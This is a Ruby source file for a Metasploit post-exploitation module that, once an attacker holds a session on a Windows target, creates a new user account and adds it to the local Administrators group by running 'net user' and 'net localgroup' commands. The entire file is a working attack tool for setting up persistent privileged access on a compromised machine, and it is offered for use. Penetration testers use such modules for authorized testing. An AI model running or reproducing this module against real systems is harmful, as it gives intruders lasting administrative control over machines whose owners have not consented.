##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Manage Admin User Account Creation',
      'Description'   => %q{
            This module allows the metasploit user to create an Admin User on the target.},
      'License'       => MSF_LICENSE,
      'Authors'       => ['ByteZealot'],
      'Platform'      => ['win']
    ))

    register_options(
      [
        OptString.new('PASSWORD', [true, "The Password of the user to add.", 'password']),
        OptString.new('USERNAME', [true, "The Username of the user to add.", 'username']),
      ], self.class)
  end


  def run
    if client.nil?
      print_error("Invalid session ID selected. Make sure the host isn't dead.")
      return
    end

    print_status("In order to create the new account, you must have Admin Privileges.")

    username = datastore['USERNAME']
    password = datastore['PASSWORD']

    account = cmd_exec("cmd.exe", "/c net user #{username} #{password} /add")
    admin = cmd_exec("cmd.exe", "/c net localgroup Administrators #{username} /add")

    if account =~ /success/i
      print_good("Standard Account was created with success.")
      if admin =~ /success/i
        print_good("Account was upgraded to the Administrator Group.")
      end
    else
      print_error("Account could not be created... Make sure you have Admin Privileges.")
    end
  end

end

